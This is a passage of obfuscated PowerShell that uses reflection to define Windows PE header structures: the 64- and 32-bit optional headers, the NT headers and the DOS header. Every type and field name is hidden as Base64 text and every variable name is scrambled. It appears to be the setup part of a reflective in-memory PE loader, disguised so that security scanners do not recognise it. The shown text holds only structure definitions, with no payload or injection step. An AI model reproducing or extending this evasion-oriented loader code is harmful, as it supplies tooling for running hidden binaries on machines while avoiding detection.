		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(224) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(232) | Out-Null
		${/=\/==\__/\/=\/\/} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${/=\/==\__/\/=\/\/}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIAMwAyAA=='))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 224)
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${__/\_/===\_/\/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(28) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${_/\/\_/\_/==\/=\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${/=\/\__/===\/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(76) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(84) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(92) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${_/\/==\/\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		${_/\_/=\_/\_/\_/==} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${_/\_/=\_/\_/\_/==}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwA2ADQA'))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 264)
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${_/=\/\/=======\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${/=\/==\__/\/=\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/==\_/=\_/\/==\_} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${_/==\_/=\_/\/==\_}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwAzADIA'))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 248)
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${_/=\/\/=======\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${_/\_/=\_/\_/\_/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\/\__/======\_/} = ${_/\__/=\/\_/=\/\/}.CreateType()
		${_____/=\_____/\__/} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${/=\/\__/======\_/}
		${_/=\/\/\/=\/\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${_/\__/=\/\_/=\/\/} = ${___/\_/=\_____/==}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABPAFMAXwBIAEUAQQBEAEUAUgA='))), ${_/=\/\/\/=\/\/===}, [System.ValueType], 64)
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQBnAGkAYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAYgBsAHAA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcgBsAGMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcABhAHIAaABkAHIA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AaQBuAGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQB4AGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwB1AG0A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGkAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\__/=\/\_/=\/\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
